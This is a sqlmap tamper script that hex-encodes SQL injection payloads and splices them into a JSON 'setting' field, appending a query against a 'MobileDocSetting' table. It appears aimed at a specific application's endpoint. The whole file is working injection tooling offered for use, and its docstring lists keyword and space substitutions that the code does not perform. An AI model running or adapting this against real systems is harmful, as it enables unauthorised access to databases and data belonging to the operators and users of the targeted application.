#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
'''
Author    :   R4gd0ll
'''

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def encode(string):
    encode_string = ""
    for char in string:
        encode_char = hex(ord(char)).replace("0x","%")
        encode_string += encode_char
    return encode_string

def tamper(payload, **kwargs):
    """
    #           and '1
    -- 
    and         anANDd
    or          oORr
    <space>     %a0
    """

    
    payload = "%27"+encode(payload)+"%20%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%4d%6f%62%69%6c%65%44%6f%63%53%65%74%74%69%6e%67%20%77%68%65%72%65%20%6e%61%6d%65%3d%27"

    payload = "\r\n[{\"scope\":\"1\",\"module\":\"2\",\"setting\":\"@"+payload+"|1\",\"modulename\":\"test111\",\"include\":\"1\",\"orasc\":\"1\"}]"
    return payload